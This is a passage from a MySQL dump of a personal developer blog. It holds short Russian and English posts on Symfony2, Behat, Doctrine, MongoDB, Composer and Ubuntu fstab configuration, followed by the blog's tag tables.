&#39;symfony2&#39;</code></pre>\r\n\r\n<p>Инициализация:</p>\r\n\r\n<pre>\r\n<code class="bash">vendor/bin/behat --init @AcmeDemoBundle</code></pre>\r\n\r\n<p>В последней версии Symfony 2.2, инициализация:</p>\r\n\r\n<pre>\r\n<code class="bash">vendor/behat/behat/bin/behat --init @AcmeDemoBundle</code></pre>\r\n\r\n<p>Запуск тестов:</p>\r\n\r\n<pre>\r\n<code class="bash">vendor/bin/behat @AcmeDemoBundle</code></pre>\r\n\r\n<p>Подсказка по существующим командам Behat:</p>\r\n\r\n<pre>\r\n<code class="bash">vendor/bin/behat -dl</code></pre>\r\n\r\n<p>А вот так по русски:</p>\r\n\r\n<pre>\r\n<code class="bash">vendor/bin/behat -dl --lang=&quot;ru&quot;</code></pre>\r\n\r\n<p>Спасибо - http://l3l0.eu/lang/en/2012/05/playing-with-behat-2-4/</p>', NULL, 1, NULL, '2013-01-06 02:28:46'),
(77, 'Файл fstab', 'fail-fstab', '<p>Для того чтобы автоматически монтировать диск при запуске Убунту, мне пришлось изучить синтаксис данного файла. Для того чтобы не забыть и может комуто еще будет полезно... <!--more--></p>\r\n\r\n<h3>Столбцы конфигурационного файла fstab</h3>\r\n\r\n<p>Все строки обладают одинаковым числом блоков. Каждый блок в строке отделен минимум одним пробелом (корректнее отделять блоки клавишей Tab). <span style="background-color: yellow;"> UUID=b60b8731-9ff7-2238f302e592 </span><span style="background-color: blue;">&nbsp;/&nbsp;</span><span style="background-color: green;"> reiserfs </span><span style="background-color: red;"> notail,relatime </span><span style="background-color: gray;">&nbsp;0 </span><span style="background-color: black; color: #ffffff;"> 1 </span></p>\r\n\r\n<h3><span style="background-color: yellow;">Желтое поле.</span></h3>\r\n\r\n<p>В желтом поле находятся названия или универсальные идентификаторы устройств. Обозначение раздела жесткого диска в Linux может представляться двумя способами: названием устройства (/dev/sda1, /dev/sdb1 и т.д.) или универсальным идентификатором (UUID). В линуксе эти оба обозначения взаимозаменяемы. В нашем примере, устройство /dev/sda1 и устройство UUID=b60b8731-9ff7-463f-a32f-2238f302e592 одно и то же. UUID назначается операционной системой автоматически при установке. Предпочтительнее в файле fstab использовать обозначение устройств по UUID, так как при обновлениях операционной системы могут измениться названия устройств (к примеру /dev/sda1 может изменить название на /dev/sdb1).</p>\r\n\r\n<h3><span style="background-color: blue; color: #fff;">Синее поле.</span></h3>\r\n\r\n<p>В синем столбике отображены точки монтирования. Точка монтирования &mdash; это директория, где нужно искать данное устройство. В нашем примере, чтобы просмотреть содержимое раздела жесткого диска /dev/sda3 нужно открыть директорию /home.</p>\r\n\r\n<h3><span style="background-color: green; color: #fff;">Зеленое поле.</span></h3>\r\n\r\n<p>В зеленом столбике описаны типы файловых систем.</p>\r\n\r\n<h4>Жесткий диск:</h4>\r\n\r\n<ul id="nospisok">\r\n	<li>ext2, ext3, ext4;</li>\r\n	<li>raserfs;</li>\r\n	<li>xfs;</li>\r\n	<li>ntfs (возможно ntfs-3g);</li>\r\n	<li>fat32;</li>\r\n	<li>vfat (это fat16).</li>\r\n</ul>\r\n\r\n<h4>USB-накопитель:</h4>\r\n\r\n<ul id="nospisok">\r\n	<li>auto (автоматическое распознавание файловой системы);</li>\r\n	<li>ntfs (возможно ntfs-3g);</li>\r\n	<li>fat32;</li>\r\n	<li>vfat (это fat16).</li>\r\n</ul>\r\n\r\n<h4>CD/DVD-привод:</h4>\r\n\r\n<ul id="nospisok">\r\n	<li>auto (автоматическое распознавание файловой системы);</li>\r\n	<li>iso9660,udf.</li>\r\n</ul>\r\n\r\n<h4>Floppy-привод:</h4>\r\n\r\n<ul id="nospisok">\r\n	<li>auto (автоматическое распознавание файловой системы);</li>\r\n	<li>vfat (это fat16);</li>\r\n	<li>fat32;</li>\r\n	<li>ext2, ext3, ext4.</li>\r\n</ul>\r\n\r\n<h3><span style="background-color: red; color: #fff;">Красное поле.</span></h3>\r\n\r\n<p>В красном столбике находятся параметры монтирования. Если параметров несколько, то они перечисляются через запятую без пробелов.</p>\r\n\r\n<table border="1" cellpadding="4" cellspacing="0" style="border:1 !important">\r\n	<tbody>\r\n		<tr>\r\n			<th>№</th>\r\n			<th>Параметр</th>\r\n			<th>Действие</th>\r\n			<th>Значение по умолчанию</th>\r\n		</tr>\r\n		<tr>\r\n			<td rowspan="2"><strong>1</strong></td>\r\n			<td>exec</td>\r\n			<td>Разрешить запуск исполняемых файлов.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr>\r\n			<td>noexec</td>\r\n			<td>Запретить запуск исполняемых файлов</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td rowspan="2"><strong>2</strong></td>\r\n			<td>auto</td>\r\n			<td>Раздел будет автоматически монтироваться при загрузке операционной системы.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td>noauto</td>\r\n			<td>Раздел не будет автоматически монтироваться при загрузке операционной системы.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td rowspan="2"><strong>3</strong></td>\r\n			<td>rw</td>\r\n			<td>Выставить права доступа на чтение и запись.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr>\r\n			<td>ro</td>\r\n			<td>Выставить права доступа только на чтение.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td rowspan="2"><strong>4</strong></td>\r\n			<td>nouser</td>\r\n			<td>Запретить простым пользователям монтировать/демонтировать устройство.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td>user</td>\r\n			<td>Разрешить простым пользователям монтировать/демонтировать устройство.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td><strong>5</strong></td>\r\n			<td>sw или swap</td>\r\n			<td>Специальный параметр SWAP области</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td rowspan="2"><strong>6</strong></td>\r\n			<td>async</td>\r\n			<td>Включение опции асинхронного ввода/вывода. Любая операция (копирование файла, удаление и т.д.) будет происходить немного позже, чем дана команда. Помогает в распределении нагрузки ОС, последняя сама выбирает подходящее время.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td>sync</td>\r\n			<td>Включение опции синхронного ввода/вывода. Любая операция происходит синхронно с командой.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td rowspan="2"><strong>7</strong></td>\r\n			<td>suid</td>\r\n			<td>Разрешить работу SUID и SGID битов. Бит SUID, у исполняемого файла, повышает запустившему пользователю права до владельца этого файла. К примеру, если root создал исполняемый файл с битом SUID, то пользователь, запустивший этот файл, получает на время исполнения файла права суперпользователя. Бит SGID, у исполняемого файла, повышает запустившему пользователю права до группы владельца этого файла.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td>nosuid</td>\r\n			<td>Заблокировать работу SUID и SGID битов для устройства.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td><strong>8</strong></td>\r\n			<td>iocharset=koi8-r codepage=866</td>\r\n			<td>Добавляет поддержку кодировки koi8-r в названиях файлов и директорий. Применять при необходимости.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td><strong>9</strong></td>\r\n			<td>errors=remount-ro</td>\r\n			<td>При ошибке перемонтировать с параметром только для чтения (ro).</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td><strong>10</strong></td>\r\n			<td>notail</td>\r\n			<td>Запрещает хранить маленькие файлы в хвостах больших. Увеличивает быстродействие.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td rowspan="3"><strong>11</strong></td>\r\n			<td>atime</td>\r\n			<td>Производить запись времени последнего доступа к файлу.</td>\r\n			<td>включена</td>\r\n		</tr>\r\n		<tr>\r\n			<td>noatime</td>\r\n			<td>Отключение записи времени последнего доступа к файлу. Увеличивает быстродействие файловой системы. Эта опция не рекомендуется стандартом POSIX, так как некоторые приложения требуют этой функции (к примеру, почтовые клиенты и программы нотификации о новой почте перестанут правильно работать).</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr>\r\n			<td>relatime</td>\r\n			<td>Включение обновления времени последнего обращения к файлу только в том случае, если предыдущее время доступа было раньше, чем текущее время изменения файла. Это более лояльный подход, чем noatime.</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n		<tr bgcolor="#f1f1f1">\r\n			<td><strong>12</strong></td>\r\n			<td>defaults</td>\r\n			<td>Использование всех параметров по-умолчанию: exec, auto, rw, nouser, async, nosuid, atime</td>\r\n			<td>&ndash;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<h3><span style="background-color: gray; color: #fff;">Серое поле.</span></h3>\r\n\r\n<p>Серое поле указывает на включение/исключение устройства хранения информации в список резервного копирования программы DUMP, если последняя используется. 0 &mdash; не выполнять резервное копирование; 1 &mdash; выполнять резервное копирование.</p>\r\n\r\n<h3><span style="background-color: black; color: #fff;">Черное поле.</span></h3>\r\n\r\n<p>Черное поле устанавливает порядок проверки раздела на наличие ошибок. Если установить один и тот же порядок для двух разделов, они будут проверяться одновременно. 0 &mdash; раздел не проверяется; 1 &mdash; раздел проверяется первым; 2 &mdash; раздел проверяется вторым и т.д.</p>', NULL, 0, NULL, '2013-01-19 11:55:18'),
(78, 'Глобальные переменные Twig Symfony2', 'global-nyie-pieriemiennyie-twig-symfony2', '<pre>\r\n<code>{# ... #}\r\n{{app.kernel.cachedir}}\r\n{{app.kernel.logdir}}\r\n{{app.kernel.rootdir}}\r\n{{app.request.basepath}}\r\n{{app.request.baseurl}}\r\n{{app.request.uri}}\r\n{{app.security.token.user}}\r\n{{app.session.locale}}\r\n{# ... #}</code></pre>\r\n\r\n<p>Источник - <a href="http://inchoo.net/tools-frameworks/symfony2-global-variables-twig/" target="_blank">http://inchoo.net/tools-frameworks/symfony2-global-variables-twig/</a></p>', NULL, 1, NULL, '2013-02-20 10:21:07'),
(79, 'Composer no matching package found', 'composer-no-matching-package-found', '<p>Нужно указать в composer.json <code>&quot;minimum-stability&quot;: &quot;dev&quot;</code> Инфа 100% и взята отсюдова - <a href="https://github.com/Behat/MinkGoutteDriver/issues/3">https://github.com/Behat/MinkGoutteDriver/issues/3</a></p>\r\n\r\n<pre>\r\n<code class="json">{\r\n    &quot;require&quot;: {\r\n        &quot;behat/behat&quot;: &quot;&gt;=2.4@stable&quot;,\r\n        &quot;behat/mink&quot;:  &quot;1.4@stable&quot;,\r\n        &quot;behat/mink-extension&quot;: &quot;*&quot;,\r\n        &quot;behat/mink-goutte-driver&quot;: &quot;*&quot;\r\n    },\r\n\r\n    &quot;minimum-stability&quot;: &quot;dev&quot;,\r\n\r\n    &quot;config&quot;: {\r\n        &quot;bin-dir&quot;: &quot;bin/&quot;\r\n    }\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>', '/uploads/2014/02/composer-no-matching-package-found.png', 1, NULL, '2013-02-22 10:01:54'),
(80, 'Семантическая верстка', 'siemantichieskaia-vierstka', '<p>Совсем недавно задался целью узнать больше о сематнической верстке и всем что с этим связано. К сожалению в интернете ничего толкового найти не удалось, не считая статеек в стиле КЭПа, мол вот у нас есть тег header он обозначает... шапку сайта! И так на первой десятке сайтов выдачи. И вот, как это бывает, совсем случайно наткнулся на замечательный сайт, по рекомендации самого <strong>Google</strong>, который направил меня туда из панели инструментов для Веб мастеров. Пользуйтесь <a href="http://schema.org/" target="_blank" title="collection of schemas">schema.org</a></p>', '/uploads/2014/02/siemantichieskaia-vierstka.jpeg', 1, NULL, '2013-07-17 08:40:10'),
(81, 'MongoDB shell', 'mongodb-shell', '<p>This must be little tutorial for command which I have use with mongodb shell. This list is not complete and will be update in future.</p>\r\n\r\n<div class="clear">&nbsp;</div>\r\n<!--more-->\r\n\r\n<table class="commands">\r\n	<thead>\r\n		<tr>\r\n			<td><strong>Shell command</strong></td>\r\n			<td><strong>Command description</strong></td>\r\n		</tr>\r\n	</thead>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n<code class="bash">mongo</code></pre>\r\n			</td>\r\n			<td>Connect to mongo shell</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n<code class="bash">show dbs</code></pre>\r\n			</td>\r\n			<td>Show all databases</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n<code class="bash">use</code></pre>\r\n			</td>\r\n			<td>Use database for all query</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n<code class="bash">db</code></pre>\r\n			</td>\r\n			<td>Show current database</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>Other see at mongo <a href="http://docs.mongodb.org/manual/reference/mongo-shell/">Shell Quick Reference</a></p>', '/uploads/2014/02/mongodb-shell.png', 1, NULL, '2013-08-08 18:55:16'),
(82, 'How to dump asserts for Entity/Document in Symfony2', 'how-to-dump-asserts-for-entity-document-in-symfony2', '<pre>\r\n<code class="php">$user = new User();\r\n/** @var \\Symfony\\Component\\Validator\\Mapping\\ClassMetadataFactory $metadataFactory */\r\n$metadataFactory = $this-&gt;get(&#39;validator.mapping.class_metadata_factory&#39;);\r\n$metadata = $metadataFactory-&gt;getMetadataFor($user);\r\n$constraints = [];\r\necho &quot;Constraints:\r\n&quot;;\r\nforeach ($metadata-&gt;properties as $property) {\r\n    foreach ($property-&gt;constraints as $constraint) {\r\n        $class = get_class($constraint);\r\n        $arrayNamespace = explode(&quot;\\\\&quot;, $class);\r\n        $class = $arrayNamespace[count($arrayNamespace) -1];\r\n        if (isset($constraint-&gt;max)) {\r\n            $constraints[$property-&gt;getName()][$class][&#39;max&#39;] = $constraint-&gt;max;\r\n        }\r\n        if (isset($constraint-&gt;min)) {\r\n            $constraints[$property-&gt;getName()][$class][&#39;min&#39;] = $constraint-&gt;min;\r\n        }\r\n        if (isset($constraint-&gt;pattern)) {\r\n            $constraints[$property-&gt;getName()][$class][&#39;pattern&#39;] = $constraint-&gt;pattern;\r\n        }\r\n        $constraints[$property-&gt;getName()][$class][&#39;groups&#39;] = $constraint-&gt;groups;\r\n    }\r\n}\r\necho json_encode($constraints); exit;</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-10-16 00:07:33'),
(83, 'Get class name from namespace', 'get-class-name-from-namespace', '<p>It&#39;s a good trick from Gedmo doctrine extensions lib:</p>\r\n\r\n<pre>\r\n<code class="php">$className = substr($namespace, strrpos($namespace, &#39;\\\\&#39;) + 1);</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-10-20 01:39:17'),
(84, 'Get metadata for class (annotation, yml, xml and other) in Symfony2 app with Doctrine', 'get-metadata-for-class-annotation-yml-xml-and-other-in-symfony2-app-with-doctrine', '<p>The common case for application that used Doctrine2 is get metadata from class. This very simple, you only need inject manager (document or entity) in your service, and than simply use:</p>\r\n\r\n<pre>\r\n<code class="php">$this-&gt;documentManager-&gt;getMetadataFactory()-&gt;getMetadataForClass($class);</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-10-25 10:23:41'),
(85, 'MongoDB Symfony2 Travis-ci', 'mongodb-symfony2-travis-ci', '<p>Задался целью подключить свой любимый OpenSource <strong>Symfony2</strong> проект, к самому популярному сервису тестирования <strong>Travis-ci</strong>. Изначально планировалось проект делать на <strong>MongoDB</strong> в качестве хранилища, поэтому задача выдалась нетривиальной. Первое что нужно знать, это то что <strong>Travis-ci</strong> уже имеет поддержку множества популярных pecl расширений. Их список можно посмотреть здесь - http://about.travis-ci.org/docs/user/languages/php/#Preinstalled-PHP-extensions. Но они все отключены, из-за чего нужно бы включить те что нам нужны. Для этого есть два способа. Я выбрал самый простой, т.к. мне нужно было всего <strong>mongodb</strong> подключить.</p>\r\n<!--more-->\r\n\r\n<pre>\r\n<code>before_script:\r\n    - echo &quot;extension = mongo.so&quot; &amp;gt;&amp;gt; ~/.phpenv/versions/$(phpenv version-name)/etc/php.ini</code></pre>\r\n\r\n<p>Также я явно указал на то что буду использовать <strong>Монгу</strong>:</p>\r\n\r\n<pre>\r\n<code>services: mongodb</code></pre>\r\n\r\n<p>Это все. Остальную часть <strong>.travis.yml</strong> я оставил без изменений. Итого, я получил следующее:</p>\r\n\r\n<pre>\r\n<code>language: php\r\n \r\nphp:\r\n  - 5.3.3\r\n  - 5.3\r\n  - 5.4\r\n \r\nbefore_script:\r\n    - echo &quot;extension = mongo.so&quot; &amp;gt;&amp;gt; ~/.phpenv/versions/$(phpenv version-name)/etc/php.ini\r\n    - composer install -n  --prefer-source\r\n \r\nservices: mongodb\r\n \r\nscript: phpunit -c app</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-11-21 11:40:05'),
(86, 'sudo npm command not found ubuntu', 'sudo-npm-command-not-found-ubuntu', '<p>I had trouble when try to install <strong>less module</strong> for <strong>nodejs</strong>. First I try this:</p>\r\n\r\n<pre>\r\n<code class="bash">npm install -g less</code></pre>\r\n\r\n<p>But got an error &quot;<strong>sudo npm command not found</strong>&quot;. So I find a solution:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo $(which npm) install -g less</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-11-22 15:07:09'),
(87, 'Load Doctrine fixtures from Controller', 'load-doctrine-fixtures-from-controller', '<p>If need to load <strong>Doctrine fixtures</strong> from <strong>controller</strong>, than you must have action like this:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n \r\n//....\r\n \r\npublic function indexAction()\r\n{\r\n    $application = new Application($this-&gt;get(&#39;kernel&#39;));\r\n    $application-&gt;add(new CreateSchemaDoctrineCommand());\r\n \r\n    $command = $application-&gt;find(&#39;doctrine:schema:create&#39;);\r\n    $commandTester = new CommandTester($command);\r\n    $commandTester-&gt;execute(\r\n        array(&#39;command&#39; =&gt; $command-&gt;getName())\r\n    );\r\n \r\n \r\n    return array();\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-11-30 22:39:20'),
(88, 'blablabla', 'blablabla', '', NULL, 0, NULL, '2013-12-12 11:15:16'),
(89, 'Work with doctrine annotation reader', 'work-with-doctrine-annotation-reader', '<p>I need for one project to work with class&nbsp;<strong>annotation</strong>&nbsp;&mdash; reed and do some work. Because I already usedoctrine&nbsp;dbal, so I decide to use&nbsp;AnnotationReader.<br />\r\nSo the first of all I create my own Annotation class:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n \r\nnamespace Kotoblog\\Annotation;\r\n \r\nuse Doctrine\\Common\\Annotations\\Annotation;\r\n \r\n/** * @Annotation * @Target(&quot;PROPERTY&quot;) */\r\nfinal class Mapping\r\n{\r\n    public $relatedClass;\r\n    public $type;\r\n    public $default;\r\n}</code></pre>\r\n\r\n<p>@Annotation&nbsp;&mdash; this means that this class use as annotation<br />\r\n@Target (&laquo;PROPERTY&raquo;)&nbsp;&mdash; use it only for a property. If use on class or method&nbsp;&mdash; exception will be throw</p>\r\n\r\n<p>We need some class:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n \r\nnamespace Kotoblog\\Entity;\r\n \r\nuse Kotoblog\\Annotation\\Mapping;\r\n \r\nclass Blogpost\r\n{\r\n    /** * @Mapping(type=&quot;integer&quot;, default=&quot;false&quot;) */\r\n    protected $id;\r\n    /** * @Mapping(relatedClass=&quot;MyVendor\\Entity\\SomeEntity&quot;, type=&quot;manyToMany&quot;) */\r\n    protected $tags;\r\n    protected $text;\r\n    protected $createdAt;\r\n}</code></pre>\r\n\r\n<p>Then we need use&nbsp;AnnotationReader&nbsp;of&nbsp;Doctrine&nbsp;with&nbsp;Reflection. So:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n \r\nrequire __DIR__ . &#39;/../vendor/autoload.php&#39;;\r\n \r\nuse Doctrine\\Common\\Annotations\\AnnotationReader;\r\n \r\nrequire __DIR__ . &#39;/../src/Kotoblog/Annotation/Mapping.php&#39;;\r\n$annotationReader = new AnnotationReader();\r\n$reflectionClass = new ReflectionClass(&#39;\\\\Kotoblog\\\\Entity\\\\Blogpost&#39;);\r\n \r\nforeach ($reflectionClass-&gt;getProperties() as $reflectionProperty) {\r\n    var_dump($annotationReader-&gt;getPropertyAnnotations($reflectionProperty));\r\n}</code></pre>\r\n\r\n<p>Annotation reader don&#39;t use composer autoload for some reasons. So you need to include annotation class&nbsp;<img alt=":(" src="http://kotoblog.pp.ua/wp-includes/images/smilies/icon_sad.gif" /><br />\r\nNow you can see all mapping information. Enjoy!</p>', NULL, 1, NULL, '2013-12-30 03:29:58');

-- --------------------------------------------------------

--
-- Структура таблицы `tags`
--

CREATE TABLE IF NOT EXISTS `tags` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `weight` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `slug_index` (`slug`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=16 ;

--
-- Дамп данных таблицы `tags`
--

INSERT INTO `tags` (`id`, `title`, `slug`, `weight`) VALUES
(1, 'Doctrine2', 'doctrine2', 3),
(2, 'Doctrine Fixtures', 'doctrine-fixtures', 1),
(3, 'Symfony2', 'symfony2', 7),
(4, 'Ubuntu', 'ubuntu', 16),
(5, 'NodeJs', 'nodejs', 1),
(6, 'MongoDb', 'mongodb', 2),
(7, 'Tests', 'tests', 3),
(8, 'PHP', 'php', 4),
(9, 'Composer', 'composer', 2),
(10, 'Twig', 'twig', 1),
(11, 'Behat', 'behat', 1),
(12, 'Joomla', 'joomla', 6),
(13, 'Gimp', 'gimp', 1),
(14, 'PrestaShop', 'prestashop', 3),
(15, 'WordPress', 'wordpress', 4);

-- --------------------------------------------------------

--
-- Структура таблицы `tag_article`
--

CREATE TABLE IF NOT EXISTS `tag_article` (
  `tag_id` int(11) NOT NULL,
  `article_id` int(11) NOT NULL,
  PRIMARY KEY (`tag_id`,`article_id`),
  KEY `IDX_300B23CCBAD26311` (`tag_id`),
  KEY `IDX_300B23CC7294869C` (`article_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `tag_article`
--

INSERT INTO `tag_article` (`tag_id`, `article_id`) VALUES
(1, 84),
(1, 87),
(1, 89),
(2, 87),
(3, 73),
(3, 76),
(3, 78),
(3, 82),
(3, 84),
(3, 85),
(3, 87),
(4, 25),
(4, 26),
(4, 27),
(4, 29),
(4, 31),
(4, 32),
(4, 33),
(4, 34),
(4, 39),
(4, 44),
(4, 50),
(4, 51),
(4, 61),
(4, 65),
(4, 75),
(4, 86),
(5, 86),
(6, 81),
(6, 85),
(7, 75),
(7, 76),
(7, 85),
(8, 22),
(8, 49),
(8, 68),
(8, 83),
(9, 74),
(9, 79),
(10, 78),
(11, 76),
(12, 28),
(12, 35),
(12, 36),
(12, 38),
(12, 42),
(12, 69),
(13, 54),
(14, 45),
(14, 46),
(14, 47),
(15, 9),
(15, 21),
(15, 23),
(15, 24);

--
-- Ограничения внешнего ключа сохраненных таблиц
--

--
-- Ограничения внешнего ключа таблицы `tag_article`
--
ALTER TABLE `tag_article`
  ADD CONSTRAINT `FK_300B23CC7294869C` FOREIGN KEY (`article_id`) REFERENCES `articles` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `FK_300B23CCBAD26311` FOREIGN KEY (`tag_id`) REFERENCES `tags` (`id`) ON DELETE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
